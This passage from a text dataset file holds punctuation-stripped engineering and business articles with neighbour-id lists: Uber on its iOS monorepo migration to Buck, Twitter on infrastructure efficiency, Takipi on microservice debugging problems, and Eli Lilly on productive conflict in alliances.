import away  our shared library had the effect of allowing seemingly independent components and classes to depend on each other  At that point  we had also amassed several years of mission critical code with no unit tests  and an API that had not aged well  We knew we could do better  so we embarked on an effort to modularize our codebase and simultaneously rewrite the core parts of our apps  such as Networking  Analytics  and others    To do this  we componentized all the critical parts of our apps into building blocks that any Uber app could use  We called these frameworks  modules  and each module was housed in its own repository  This modularization allowed us to spin up quick prototype apps when needed  as well as bootstrap real production software  For instance  when we decided to spin UberEATS off into its own separate application in late 2015  the UberEATS team heavily leveraged the new modules we built  Engineers were able to spend most of their time working on the product  rather than platform requirements  For example  we built a UI toolkit that implemented the typography  color scheme  and common UI elements that designers across the company used in our mobile apps   At the start of 2015  we had five modules  As of early 2017  we now have over forty  ranging from framework level libraries  such as networking and logging  to product specific libraries  such as mapping and payments   shared between applications  All three apps  Rider  Driver  and EATS  rely on this shared infrastructure  Bug fixes and performance improvements in our modules are immediately reflected in the applications that use them a huge benefit of this setup  Overall  our modularization effort was a major success   But as we scaled from five to over forty modules  we ran into some problems  We realized that we had a hard time scaling with Cocoapods due to the amount of modules we had and their interdependencies  At the same time  more than 150 engineers had joined our wider iOS team  which meant that our applications and modules were in a state of constant evolution   Time for a Change  As the company continued to grow  our engineering needs began to change  Once we started integrating many more libraries into our applications  we quickly hit the limits of CocoaPods  dependency resolution capabilities  At first  our pod install times were under ten seconds  Then  they numbered in the minutes  Our dependency graph was so complex that engineers were collectively burning hours each day waiting for CocoaPods to resolve the graph and integrate our modules  This time waste was even worse on our Continuous Integration infrastructure   We also felt the strain of a multiple repository approach  Each module was housed in its own repository  and any given module could depend on many other modules  Therefore  a change inside one module required updating the Podfile of the application before the change could appear  Large breaking changes required updating all modules that depended on the one where the change was made   Since we needed to version all of these modules in order to integrate them  we adopted the semantic versioning convention for tagging our modules  While semantic versioning itself is a simple concept  what constitutes a breaking change in reality could vary with different compiler settings   As a result  a seemingly innocuous code change in a given module could introduce errors  or warnings  which we treat as errors on CI  in other dependent modules or applications  As an example  consider the following snippet of code  some boilerplate removed for brevity    public enum KittenType    case regular  case munchkin     public protocol KittenProtocol    public var type  KittenType   get    public var name  String   get set       public struct Kitten  KittenProtocol      public protocol Kittens    var kittens  Set Kitten    get    func contains aKitten ofType  KittenType     Bool     At first glance  it might seem like adding a new property to the KittenProtocol shouldn t raise an error outside your module  But it might  depending on the access control level of that protocol  Anyone could conform to the protocol if we made it publicly accessible outside of our module  let s call this module  UberKittens  because that seems apt   Adding a new property  then  would be a breaking change because properties in a protocol must be implemented in their conforming class or struct   Even adding a new case to the KittenType enumeration constitutes a breaking change in this setup  Again  since we made this enum public  any existing switch statements that use it will produce a compiler error for the new  missing case not being handled   The above issues are minimal and can easily be resolved by any consumer of the UberKittens module  But the only way to make these changes safe in a semantic versioning world is to make the patch contain a major version bump  We have hundreds of engineers and hundreds of changes happening on any given day  It s impossible to catch every potential breaking change  Plus  updating any libraries that your library depends on could introduce dozens of warnings in your code that you would have to resolve   We really wanted our engineers to be able to move fast and to make the changes they needed to make without having to worry about version numbers  Resolving conflicting versions was frustrating for developers and  as mentioned earlier  CocoaPods had become very slow to resolve our now complex dependencies  We also didn t want engineers spending days updating modules in the dependency graph in order to see their changes in the applications we ship  Engineers should be able to make any and all changes they need to  in as few commits as possible   The solution  A monolithic repository   Planning the Monorepo  Of course  monolithic repositories are not a new idea  many other large tech companies have adopted them with great success  While putting all your code into one repository can have its downsides  VCS performance  breakages that affect all targets  etc    the upsides can be huge  depending on the development workflow  With a monorepo  our engineers could make breaking changes which spanned across modules atomically  in just one commit  With no version numbers to worry about  resolving our dependency graph would be much simpler  Since we are a company with hundreds of engineers in many disparate teams  we could centralize all our iOS code in one place  making it easier to discover   We couldn t pass up these benefits  so we knew we needed a monorepo  However  we weren t sure what tooling we would need to handle it  When we first began our modularization effort  we considered building a monorepo around CocoaPods  But that would have meant having to build every application and every module for every code change an engineer might put up for code review  We wanted to be smarter about building only what changed  but that would have required investing thousands of engineering hours into a tool that could intelligently rebuild only the parts that changed   Luckily  a tool came along that can do this  and more   and it s called Buck   Buck Saves the Day  Buck is a build tool built for monolithic repositories that can build code  run unit tests  and distribute build artifacts across machines so that other developers can spend less time compiling old code and more time writing new code  Buck was built for repositories with small  reusable modules and it leverages the fact that all the code is in one place to intelligently analyze the changes made and build only what s new  Since it is built for speed  it also takes advantage of the multi core CPUs our engineers have in their laptops  so that multiple modules can be built at the same time  Buck can even run unit test targets at the same time   We d heard a lot of good things about Buck  but couldn t utilize it until it publicly supported iOS and Objective C projects  When Facebook announced Buck for iOS support during the 2015  Scale conference  we were excited to start testing Buck against our applications   Our initial tests showed that using Buck could greatly improve our build and test times on CI  Ordinarily  when using xcodebuild  the best approach is to always clean before building and or testing  Any given CI host could be building commits that are backwards  and forwards  in the commit history  which means that the cache will constantly be in flux  Because of this  the xcodebuild cache can be unstable  and our CI stability is a top priority   But if you have to clean before you build  CI jobs will be unnecessarily slow  since you can t incrementally build only new changes  So our build times skyrocketed along with our growth  With hundreds of engineers  the collective hours lost waiting for CI to build code changes numbered in the thousands every day   Buck solves this problem with a reliable  and optionally  distributed  cache  It aggressively caches built artifacts and will also build on as many cores as are available to it  When a target is built  it won t be rebuilt until the code in that target  or one of the targets it depends on  changes  That means you can set up a repository where the tooling will intelligently determine what needs to be rebuilt and retested  while caching everything else   Our CI machines benefit greatly from this cache architecture  Today  when an engineer puts up a code change that requires a rebuild  those build artifacts are distributed in future builds on that machine and others  Engineers can save even more time by using the artifacts already built on CI locally for their builds too  We recently open sourced an implementation of Buck s HTTP Cache API for teams to use   Buck offers other benefits  too  We can remove a common cause of merge conflicts and developer frustration by using Buck to generate our Xcode project files  This allows every iOS application at Uber to share a common set of project settings  Engineers can easily code review any changes to these settings since they are in easy to read configuration files instead of buried deep in an Xcode project file   Furthermore  since Buck is a fully fledged tool with support for building and testing  our engineers can check the validity of their code without ever loading Xcode  Tests can be run using one command  which runs the tests in xctool  Even better  if our engineers want to forgo Xcode altogether  they can open Nuclide  which adds debugging support and auto completion to the Atom text editor   The Big Mobile Migration  How did we migrate to a monorepo  The answer is  with a lot of dry runs  Much of the work was repeatable and deterministic  so we wrote scripts to do the heavy lifting for us  For example  all our modules consisted of a CocoaPods podspec file  We published this podspec to an internal  private podspecs repository that CocoaPods used when integrating  Those podspecs could be mapped 1 1 to a corresponding Buck file  named  BUCK    so we wrote a script which generated the BUCK file and replaced the podspec   We also created a dummy monorepo solely for testing purposes which mimicked the proposed repo structure using symbolic links  This allowed us to easily test the monorepo structure and setup  as well as update the modules as they changed   However  we noticed that changes in modules quickly made the test repository out of date  We had landed BUCK files in all of the modules  but in the meantime our engineers still had to use the podspec files  So  we needed a way to keep the Buck files and podspecs in sync  To do this  we bootstrapped the test repository on all module changes in CI and signaled to the engineer when their change broke any code or module in the test repository   This setup helped acquaint engineers with the new  Buck world  that was coming while also keeping the BUCK files up to date  In the final week before the migration  we did this for the applications too so that engineers would know if their code patch broke the applications in the Buck universe   Constructing the actual monorepo was a challenging endeavor  We knew that we would eventually have to create it  but the question was  when  Originally  we planned on constructing it the same weekend we were going to move all the tooling and infrastructure to the new setup  But if we could do it weeks earlier  it would save us added stress later on  The migration was also something we could script  since the steps were reproducible for all repositories  The general steps we followed to create the monorepo were     Clone the repository to be merged into a temp directory  Move all the files in that repository to the corresponding path in the monorepo  Commit that change and push it to a remote branch with a specific name  Enter the monorepo and add the repository to be merged as a remote  Merge the remote branch into the monorepo  Delete the remote branch from the repository which was merged  Determine the commit which represents HEAD from the repository which was merged  Commit it into a hidden file  We ll use the file later when updating the monorepo  Repeat steps 1 7 for the next repository   Once we created the monorepo  we had to figure out how to keep it up to date over the coming weeks  We did this by utilizing the file we created in step 7  Since it represented the HEAD sha when the monorepo was last updated from the original repository  we could run a script every hour which would create a git patch from that last update sha to HEAD  and then apply the patch in the monorepo at the correct path   The migration itself was pretty simple  and we managed to do it over a single weekend  We temporarily blocked all our repositories at the git layer  switched all our CI jobs to use Buck commands instead of xcodebuild  and deleted all our Xcode project files and podspecs  Since we had spent the past few months testing the projects  our CI jobs and our release pipeline  we felt confident when we launched the monorepo in May 2016   The Results  Centralizing All iOS Code  With the monorepo  we centralized all our iOS code into one place  We organized our repository into this directory structure       apps        iphone driver        iphone eats        iphone rider      libraries        analytics                 utilities      vendor      fbsnapshottestcase             ocmock  Now  a breaking API change in the analytics module would require updating all consumers of that module in the same commit  Buck will only build and test analytics and any modules that depend on analytics  Conversely  we no longer have any version conflicts  and we always know that master is green   The biggest benefits however  came from switching to the Buck cache   Let builders build  we bucked the trend of previously longer build times under xcodebuild   Comparing the xcodebuild build and buck build steps  we saw a huge win since we were no longer cleaning our cache before every CI job  By switching to a tool with a trustworthy cache  we can share built artifacts between CI hosts too  Buck can also cache test results  so if we know a module has already been tested and is not affected by a certain code change  we can skip those tests   Overall  our migration was a success  However  there were some costs with moving to a monorepo that we initially couldn t avoid  such as decreased git performance and the reality that when master breaks  all code is affected   For example  we started to see that perfectly valid commits that passed on CI would fail when rebased on top of the master branch  When we first launched the monorepo  we had to vigilantly revert failing commits at all hours of the day  On the worst days  10  of commits would have to be reverted  which resulted in hours of lost developer time  To resolve this  we introduced a system  called Submit Queue  between the repository merge and push operations  which we call  land  at Uber  since we use Arcanist   When an engineer attempts to land their commit  it gets enqueued on the Submit Queue  This system takes one commit at a time  rebases it against master  builds the code and runs the unit tests  If nothing breaks  it then gets merged into master  With Submit Queue in place  our master success rate jumped to 99    Conclusions  Moving to a new toolchain provided us with the foundation to experiment with new ideas to build our applications faster and better  Recently  our team has been working with Facebook s Buck team to add full Swift support to Buck  as well as support for macOS and iOS Dynamic Frameworks  This has allowed us to utilize the benefits of Buck while we move our codebase into the Swift era   Moving our code into one place and our apps to Buck were just a few steps on our path to modernizing how we do development  Alongside us  our Android team has also adopted Buck  and they too have seen the benefits of fast  reproducible builds  But we re not stopping here  our team is committed to adding more features to Buck s iOS support over the coming year  and we also plan to ramp up our Open Source efforts to contribute back to the wider mobile community   Alan Zeino is a software engineer based in Uber s San Francisco office  Want to join our team  We re hiring   Photo Header Credit   Mobile reedbuck calf running solo  by Conor Myhrvold  South Luangwa National Park  Zambia,"[1399 713 1300 1377 673 1225 550 778 1027 895 929]"
1402,training-dataset/engineering/531.txt,engineering,a method for transmitter identificationIf you ever connected to the Internet before the 2000s  you probably remember that it made a peculiar sound  But despite becoming so familia,"[1402 664 18 884 1373 1106 794 414 712 778 1341]"
1403,training-dataset/engineering/811.txt,engineering,The infrastructure behind Twitter  efficiency and optimizationIn the past  we ve published details about Finagle  Manhattan  and the summary of how we re architected the site to be able to handle events like Castle in the Sky  the Super Bowl  2014 World Cup  the global New Year s Eve celebration  among others  In this infrastructure series  we re focusing on the core infrastructure and components that run Twitter  We re also going to focus each blog on efforts surrounding scalability  reliability  and efficiency in a way that highlights the history of our infrastructure  challenges we ve faced  lessons learned  upgrades made  and where we re heading   Data center efficiency  History  Twitter hardware and data centers are at the scale few technology companies ever reach  However  this was not accomplished without a few missteps along the way  Our uptime has matured through a combination of physical improvements and software based changes   During the period when the fail whale was prevalent  outages occurred due to software limitations  as well as physical failures at the hardware or infrastructure level  Failure domains existed in various definitions which had to be aggregated to determine the risk and required redundancy for services  As the business scaled in customers  services  media content  and global presence  the strategy evolved to efficiently and resiliently support the service   Challenges  Software dependencies on bare metal were further dependant on our data centers  ability to operate and maintain uptime of power  fiber connectivity  and environment  These discrete physical failure domains had to be reviewed against the services distributed on the hardware to provide for fault tolerance   The initial decision of which data center service provider to scale with was done when specialization in site selection  operation  and design was in its infancy  We began in a hosted provider then migrated to a colocation facility as we scaled  Early service interruptions occurred as result of equipment failures  data center design issues  maintenance issues  and human error  As a result  we continually iterated on the physical layer designs to increase the resiliency of the hardware and the data center operations   The physical reasons for service interruptions were inclusive of hardware failures at the server component level  top of rack switch  and core switches  For example  during the initial evaluation of our customized servers  the hardware team determined the cost of the second power supply was not warranted given the low rate of failure of server power supplies   so they were removed from the design  The data center power topology provides redundancy through separate physical whips to the racks and requires the second power supply  Removal of the second power supply eliminated the redundant power path  leaving the hardware vulnerable to impact during distribution faults in the power system  To mitigate the impact of the single power supply  ATS units were required to be added at the rack level to allow a secondary path for power   The layering of systems with diverse fiber paths  power sources  and physical domains continued to separate services from impacts at relatively small scale interruptions  thus improving resiliency   Lessons learned and major technology upgrades  migrations  and adoptions  We learned to model dependencies between the physical failure domains   i e  building power and cooling  hardware  fiber  and the services distributed across them to better predict fault tolerance and drive improvements   We added additional data centers providing regional diversity to mitigate risk from natural disaster and the ability to fail between regions when it was needed during major upgrades  deploys or incidents  The active active operation of data centers provided for staged code deployment reducing overall impacts of code rollouts   The efficiency of power use by the data centers has improved with expanding the operating ranges of the environmental envelope and designing the hardware for resiliency at the higher operating temperatures   Future work  Our data centers continue to evolve in strategy and operation  providing for live changes to the operating network and hardware without interruption to the users  Our strategy will continue to focus on scale within the existing power and physical footprints through optimization and maintaining flexibility while driving efficiency in the coming years   Hardware efficiency  History and challenges  Our hardware engineering team was started to qualify and validate performance of off the shelf purchased hardware  and evolved into customization of hardware for cost and performance optimizations   Procuring and consuming hardware at Twitter s scale comes with a unique set of challenges  In order to meet the demands of our internal customers  we initially started a program to qualify and ensure the quality of purchased hardware  The team was primarily focused on performance and reliability testing ensuring that systems could meet the demands  Running systematic tests to validate the behavior was predictable  and there were very few bugs introduced   As we scaled our major workloads  Mesos  Hadoop  Manhattan  and MySQL  it became apparent the available market offerings didn t quite meet the needs  Off the shelf servers come with enterprise features  like raid controllers and hot swap power supplies  These components improve reliability at small scale  but often decrease performance and increase cost  for example some raid controllers interfered with the performance of SSDs and could be a third of the cost of the system   At the time  we were a large user of mysql databases  Issues arose from both supply and performance of SAS media  The majority of deployments were 1u servers  and the total number of drives used plus a writeback cache could predict the performance of a system often time limited to a sustained 2000 sequential IOPS  In order to continue scaling this workload  we were stranding CPU cores and disk capacity to meet IOPS requirement  We were unable to find cost effective solutions at this time   As our volume of hardware reached a critical mass  it made sense to invest in a hardware engineering team for customized white box solutions with focus on reducing the capital expenses and increased performance metrics   Major technology changes and adoption  We ve made many transitions in our hardware technology stack  Below is a timeline for adoptions of new technology and internally developed platforms   2012   SSDs become the primary storage media for our MySQL and key value databases   2013   Our first custom solution for Hadoop workloads is developed  and becomes our primary bulk storage solution   2013   Our custom solution is developed for Mesos  TFE  and cache workloads   2014   Our custom SSD key value server completes development   2015   Our custom database solution is developed   2016   We developed GPU systems for inference and training of machine learning models   Lessons learned  The objective of our Hardware Engineering team is to significantly reduce the capital expenditure and operating expenditure by making small tradeoffs that improve our TCO  Two generalizations can apply to reduce the cost of a server   Removing the unused components Improving utilization  Twitter s workload is divided into four main verticals  storage  compute  database  and gpu  Twitter defines requirements on a per vertical basis  allowing Hardware Engineering to produce a focused feature set for each  This approach allows us to optimize component selection where the equipment may go unused or underutilized  For example  our storage configuration has been designed specifically for Hadoop workloads and was delivered at a TCO reduction of 20  over the original OEM solution  At the same time  the design improved both the performance and reliability of the hardware  Similarly  for our compute vertical  the Hardware Engineering Team has improved the efficiency of these systems by removing unnecessary features   There is a minimum overhead required to operate a server  and we quickly reached a point where it could no longer remove components to reduce cost  In the compute vertical specifically  we decided the best approach was to look at solutions that replaced multiple nodes with a single node  and rely on Aurora Mesos to manage the capacity  We settled on a design that replaced two of our previous generation compute nodes with a single node   Our design verification began with a series of rough benchmarks  and then progressed to a series of production load tests confirming a scaling factor of 2  Most of this improvement came from simply increasing the thread count of the CPU  but our testing confirmed a 20 50  improvement in our per thread performance  Additionally we saw a 25  increase in our per thread power efficiency  due to sharing the overhead of the server across more threads   For the initial deployment  our monitoring showed a 1 5 replacement factor  which was well below the design goal  An examination of the performance data revealed there was a flawed assumption in the workload characteristics  and that it needed to be identified   Our Hardware Engineering Team s initial action was to develop a model to predict the packing efficiency of the current Aurora job set into various hardware configurations  This model correctly predicted the scaling factor we were observing in the fleet  and suggested we were stranding cores due to unforeseen storage requirements  Additionally  the model predicted we would see a still improved scaling factor by changing the memory configuration as well   Hardware configuration changes take time to implement  so Hardware Engineering identified a few large jobs and worked with our SRE teams to adjust the scheduling requirements to reduce the storage needs  These changes were quick to deploy  and resulted in an immediate improvement to a 1 85 scaling factor   In order to address the situation permanently  we needed to adjust to configuration of the server  Simply expanding the installed memory and disk capacity resulted in a 20  improvement in the CPU core utilization  at a minimal cost increase  Hardware Engineering worked with our manufacturing partners to adjust the bill of materials for the initial shipments of these servers  Follow up observations confirmed a 2 4 scaling factor exceeding the target design   Migration from bare metal to mesos  Until 2012  running a service inside Twitter required hardware requisitions  Service owners had to find out and request the particular model or class of server  worry about your rack diversity  maintain scripts to deploy code  and manage dead hardware  There was essentially no  service discovery   When a web service needed to talk to the user service  it typically loaded up a YAML file containing all of the host IPs and ports of the user service and the service used that list  port reservations were tracked in a wiki page   As hardware died or was added  managing required editing and committing changes to the YAML file that would go out with the next deploy  Making changes in the caching tier meant many deploys over hours and days  adding a few hosts at a time and deploying in stages  Dealing with cache inconsistencies during the deploy was a common occurrence  since some hosts would be using the new list and some the old  It was possible to have a host running old code  because the box was temporarily down during the deploy  resulting in a flaky behavior with the site   In 2012 2013  two things started to get adopted at Twitter  service discovery  via a zookeeper cluster and a library in the core module of Finagle  and Mesos  including our own scheduler framework on top of Mesos called Aurora  now an Apache project    Service discovery no longer required static YAML host lists  A service either self registered on startup or was automatically registered under mesos into a  serverset   which is just a path to a list of znodes in zookeeper based on the role  environment  and service name   Any service that needed to talk to that service would just watch that path and get a live view of what servers were out there   With Mesos Aurora  instead of having a script  we were heavy users of Capistrano  that took a list of hosts  pushed binaries around and orchestrated a rolling restart  a service owner pushed the package into a service called  packer   which is a service backed by HDFS   uploaded an aurora configuration that described the service  how many CPUs it needed  how much memory  how many instances needed  the command lines of all the tasks each instance should run  and Aurora would complete the deploy  It schedules instances on an available hosts  downloads the artifact from packer  registers it in service discovery  and launches it  If there are any failures  hardware dies  network fails  etc   Mesos Aurora automatically reschedules the instance on another host   Twitter s Private PaaS  Mesos Aurora and Service Discovery in combination were revolutionary  There were many bugs and growing pains over the next few years and many hard lessons learned about distributed systems  but the fundamental design was sound  In the old world  the teams were constantly dealing with and thinking about hardware and its management  In the new world  the engineers only have to think about how best to configure their services and how much capacity to deploy  We were also able to radically improve the CPU utilization of Twitter s fleet over time  since generally each service that got their own bare metal hardware didn t fully utilize its resources and did a poor job of managing capacity  Mesos allows us to pack multiple services into a box without having to think about it  and adding capacity to a service is only requesting quota  changing one line of a config  and doing a deploy   Within two years  most  stateless  services moved into Mesos  Some of the most important and largest services  including our user service and our ads serving system  were among the first to move  Being the largest  they saw the biggest benefit to their operational burden  This allowed them to reduce their operational burden   We are continuously looking for ways to improve the efficiency and optimization of the infrastructure  As part of this  we regularly benchmark against public cloud providers and offerings to validate our TCO and performance expectations of the infrastructure  We also have a good presence in public cloud  and will continue to utilize the public cloud when it s the best available option  The next series of this post will mainly focus on the scale of our infrastructure   Special thanks to Jennifer Fraser  David Barr  Geoff Papilion  Matt Singer  and Lam Dong for all their contributions to this blog post,"[1403 1336 1351 92 673 500 597 1010 1117 42 1373]"
1405,training-dataset/engineering/827.txt,engineering,Microservices in Production  5 Challenges You Should KnowThe dark side of microservices  What can possibly go wrong   It seems like everyone are into microservices these days  while monolith architectures are just as popular as crumbling down old and abandoned castles   The public attention certain trends get is often exaggerated and doesn t reflect what s going on in practice  but this time it feels more like a consensus  Microservices iterate over the basic separation of concerns principle and put a name on insights from teams of engineers who crafted solutions to real problems they needed to solve   In this post  we ll play the devil s advocate  share some insights from the community and our users  examine the top issues with microservices in production   And how you can solve them   New Post  5 Ways to NOT F  K Up Your Microservices in Production https   t co RfdxwrE5qm pic twitter com I5J1h0JEUW   Takipi   takipid  May 5  2016  The flip side of microservices  Separation of concerns is not a new concept  neither distributed computing  The benefits are huge  but they come at a price which usually translates to higher ops costs both in time and money  Mix the two  and you get a petri dish of all sorts of awkward problems  Put it in production  and the problems quadruple  Debugging to the rescue  but oh wait   Debugging is not about making problems go away   As Bryan Cantrill points out on his talk in QCon   debugging devolved into an oral tradition  folk tales of problems that were made to go away   When in fact  it is more like a science  understanding how the system really works and not how we THINK it works   Debugging is not just minor side task  it s a fundamental issue  Sir Maurice Wilkes  debugger of one of the first programs ever created  already realized the major role debugging is going to play for developers    In 1949 as soon as we started programming  we found to our surprise that it wasn t as easy to get programs right as we had thought  Debugging had to be discovered  I can remember the exact instant when I realised that a large part of my life from then on was going to be spent in finding mistakes in my own programs    We were made into thinking that it s just about making problems go away  When the real challenge is about understanding how the system really works   Problem  1  As if monitoring a monolith wasn t hard enough  Whether you re gradually breaking down a monolithic app to microservices or building a new system from scratch  you now have more services to monitor  Each of these is highly likely to     Use different technologies   languages    Live on a different machine   container    Have its own version control  The point is that monitoring wise  the system becomes highly fragmented and a stronger need arises for centralized monitoring and logging  to have a fair shot at understanding what s going on   For example  one of the scenarios described in a recent Continuous Discussions podcast was a bad version that needs to be rolled back  Mostly a straightforward procedure for monoliths  But  We have microservices now  So we need to identify which of the services needs to be rolled back  what would be the impact of the rollback on the other services  or maybe we just need to add some capacity  but then it could just push the problem to the next service in line   Takeaway  1  If you thought monitoring a monolith architecture was hard  it s 10x harder with microservices and requires a bigger investment in planning ahead   Problem  2  Logging is distributed between services  Logs logs logs  GBs of unstructured text is generated by servers on a daily basis  The IT equivalent of carbon emission  in the shape of overflowed hard drives and crazy Splunk bills   ELK storage costs  btw  if you re looking into Splunk or ELK  you should check out our latest eBook  Splunk vs ELK  The Log Management Tools Decision Making Guide   With a monolith architecture  your logs are probably already scattered in different places  since even with a monolith mindset you probably had to use a few different layers that probably log to different places  With microservices   your logs break further down  Now when investigating a scenario related to some user transaction  you ll have to pull out all the different logs from all the services that it could have gone through to understand what s wrong   In Takipi  our team solves this by using Takipi  on Takipi  For all log errors and warnings coming from production JVMs  we inject a smart link into the log which leads to the event s analysis  Including it s full stack trace and variable state at every frame  even if it s distributed between a number of services   machines   Takeaway  2  Microservices are all about breaking things down to individual components  As a side effect  ops procedures and monitoring are also breaking down per service and lose their power for the system as a whole  The challenge here is to centralize these back using proper tooling   Problem  3  An issue that s caused by one service  can cause trouble elsewhere  If you follow up on some broken transaction in a specific service  you don t have the guarantee that the same service you re looking at is to blame  Let s assume you have some message passing mechanism between your services  like RabbitMQ  ActiveMQ  or maybe you re using Akka   There could be several possible scenarios going on  even if the service behaves as expected and there s no problem to be found     The input it received is bad  and then you need to understand what made the previous service misbehave    The recipient of its result returned some unexpected response  and then you need to understand how the next service behaves    What about the highly likely scenario where these dependencies are more complex than 1 1  Or there s more than one service that benefits to the problem   Whatever the problem is  the first step with microservices is to understand where to start looking for answers  The data is scattered all over the place  and might not even live within your logs and dashboard metrics at all   Takeaway  3  With monoliths you usually know that you re looking at the right direction  microservices make it harder to understand what s the source of the issue and where you should get your data from   Problem  4  Finding the root cause of problems  Alright  let s carry on with the investigation  The starting point now is that we ve nailed down the problematic services  pulled out all the data there s to pull  stack traces and some variable values from the logs  If you have an APM  Like New Relic  AppDynamics or Dynatrace  which we also wrote about here and here  you might also get some data about unusually high processing times for some of the methods   do some basic assessment of the severity of the issue   But  What about  The actual issue  The real root cause  The code that s actually broken   In most cases  the first few bits of variable data you HOPEFULLY get from the log won t be the ones that move the needle  They usually lead to the next clue which requires you to uncover some more of the magic under the hood and add another beloved log statement or two  Deploy the change  hope for the issue to reoccur  or not  because  sometimes merely adding a logging statement seems to solve issues  Some sort of a diabolical reverse Murphy s law  Oh well   Takeaway  4  When the root cause of an error in a microservice spans across multiple services  it s critical to have a centralized root cause detection tool in place  If you re using Java   other JVM languages  be sure to check out the stuff we do at Takipi     Takipi s Error Analysis Dashboard   variable values overlaid on the actual code at every frame in the stack   See a live demo  Problem  5  Version management and cyclic dependencies between services  Another issue that was mentioned in the Continuous Discussions podcast that we d like to highlight here is going from a layer model in a typical monolithic architecture  to a graph model with microservices   Two problems that can happen here relate to keeping your dependencies in check   1  If you have a cycle of dependencies between your services  you re vulnerable to distributed stack overflow errors when a certain transaction might be stuck in a loop   2  If two services share a dependency  and you update that other service s API in a way that could affect them  then you ll need to updated all three at once  This brings up questions like  which should you update first  And how to make this a safe transition   More services means different release cycles for each of them which adds to this complexity  Reproducing a problem will prove to be very difficult when it s gone in one version  and goes back in a newer one   Takeaway  5  In a microservice architecture you re even more vulnerable to errors coming in from dependency issues   Final Thoughts  Debugging immediately gets you in the mindset of making problems go away  this is literally the direct meaning of the word debugging  When you think of it with the system s context in mind  there s much more to it than ad hoc problem solving  It s about understanding the system as a whole  what makes it tick  and how things really are versus how you hope they d be   At the bottom line  it s all about the tools you use and the workflows you employ  This is precisely what we had in mind while building Takipi  solving these exact type of issues  and turning the world of application logs upside down to face the current state of production applications,"[1405 773 234 778 1351 278 1126 548 1159 1377 60]"
1407,training-dataset/business/1191.txt,business,The Right Kind of Conflict Leads to Better ProductsOysters and alliances have something in common  a little irritation can produce a thing of beauty  When partners in an alliance come into conflict  it can be just what is needed to produce a technically and commercially successful product   Eli Lilly and Company measures the health of its alliances with a  Voice of the Alliance Survey   Members from each partner organization rate the alliance in areas related to strategic fit  operational fit  and cultural fit  Sample questions include   Knowledge and information from our partner is freely shared with us  and  Our partner openly listens to our ideas and opinions   Lilly recently analyzed fourteen years of data to understand the relationship between the health of these alliances  as evidenced by the ratings on the survey  and the technical and commercial success of the products on which they worked   The results were fascinating   When the Lilly employees in the alliance were irritated with the partner  there was an increased probability of technical and commercial success  It wasn t that they didn t like their partners  they typically held them in high regard  What distinguished successful from unsuccessful alliances was more of a  productive  irritation   creative tension between differing ideas about how to develop alliance products   reflected in disagreements about the strategy and tactics of how best to develop a particular molecule  Even more interesting  there was no relationship between how the partner viewed the alliance and future success  What mattered in forecasting success was how Lilly people viewed the alliance   Here s an example  Lilly and its alliance partners might differ in how to design a clinical trial  These design differences have significant resource implications for both organizations  Tensions are often high as experts from both sides argue the merits of each other s ideas  Professional opinions clash and irritation results as both parties struggle to make the best decision  It is this kind of irritation that forecasts later technical success  according to fourteen years of survey data   Why does this happen  Enrique Conterno  Senior Vice President and President  Lilly Diabetes  sums it up well   Nothing great is achieved without some conflict  Conflict sharpens the senses  it invites full engagement in solving important problems  However  you must create more light than heat when you engage in conflict  Heat degrades the substrate of innovation  while light catalyzes it    This idea that disagreement and conflict between groups can be productive is not new  We see similar findings in research looking at individual work teams  For example  the research of Amy Edmondson and Alicia Tucker in hospital emergency rooms shows that the failure to speak up can lead to medical mistakes with disastrous consequences  Similar failures among cockpit crews can lead to airline crashes  Finally  there are countless examples of business misconduct among corporations where employees were aware of misconduct but they simply did not feel comfortable speaking up and reporting it  Creating an environment where team members feel  psychologically safe  to speak up and share their point of view can dramatically improve the effectiveness of these kinds of teams  Lilly s research shows these same effects can happen between members of alliance innovation teams   The managers in charge of these alliances caution us  however  that a positive relationship between irritation and success does not mean that you should be looking for opportunities to create just any conflict  The beneficial irritation is respectful conflict on the most pivotal issues to the project   Leaders can enhance the value they get from alliances using various strategies that reap the benefits of conflict   Focus on the areas of risk that produce the most productive conflict  Lilly trains its alliance managers to look at risk as the precursor to conflict  as parties typically engage in conflict as a method of reducing or controlling alliance risk  They regularly see three common types of risks  human risk   the sum of the positive or negative affinities of people working in an alliance  weighted more heavily towards those leaders that govern the alliance  business risk   all of the factors related to getting a product or service to market made easier or more difficult due to the partnership  and legal uncertainties   the risk that is created by writing a contract that cannot possibly foresee all of the future obstacles and issues that will need to be surmounted by the alliance  Conflict in each of these areas is interconnected and is found in every alliance   Focus your conflict management resources where it matters most  In the pharmaceutical industry  the conflict surrounding a clinical trial design  for example  represents a value inflection point where managed or mismanaged conflict will yield disproportionate value creation or destruction  These clinical trials require thoughtful design and involve high levels of disagreement and conflict even without an alliance partner and logarithmically more disagreement and conflict with an alliance partner  Identify clearly where value is created and destroyed in your own value process and deploy your conflict management alliance management resources there  During one alliance that was mired in conflict while designing a very complicated  200M clinical trial  Lilly and its partner agreed to use both alliance management and decision science experts to help the group work through the complexity and the conflict   Train key alliance personnel to listen and make space for disagreement and conflict  Lilly trains its alliance managers to use structured empathic listening  a manner of listening and responding to others that improves mutual understanding and trust  This skill is borrowed from couples  therapy and allows each party to be heard and understood  without having to necessarily agreeing to what is heard and understood  Lilly alliance managers report that conflict  heat  becomes  illumination  when partners truly listen to each other   Although it seems counterintuitive  slowing down a conflict to allow time for listening to each other actually saves time in the long run   At Lilly  escalated alliance issues are strongly encouraged to be presented jointly  The disputants need not agree with each other  but they must agree that their joint presentation accurately reflects their disagreement  This aligned presentation often catalyzes quick and healthy issue resolution   Establish an alliance management function  If resources allow  the formation of such an area within your organization will increase the chances of alliance success  Task the alliance management team with creating greater value by learning how to build  maintain  and unwind alliances efficiently and effectively   and train them in spotting and encouraging productive conflict  An alliance management department can be both a repository of information and experiences  as well as a champion for the organizational learning that comes from forming alliances  where each company can benefit by learning from and emulating the best that their partners have to offer  Lilly s Office of Alliance Management was established in 1999 and has published over twenty articles  focused on the  How To s of Alliance Management  which can be used as resources for the successful implementation of such a functional area  The Association for Strategic Alliance Professionals  a cross  industry organization dedicated to advancing the skills of alliance management professionals  offers a variety of tools and educational and developmental opportunities to support your efforts   Particularly with partners  we often try to avoid conflict to avoid irritation  But too little irritation risks failing to create the pearls of wisdom that good conflict can produce  Leaders should look beyond irritation to the benefits of the right kind of conflict  even seeking to create good conflict at the most pivotal value and risk inflection points  An oyster takes up to 24 months to culture a grain of sand into a pearl  but with careful alliance structures  active listening  and other techniques suggested above  leaders can much more quickly use alliance conflict as a source of significant value,"[1407 778 588 344 895 712 572 656 1351 935 300]"
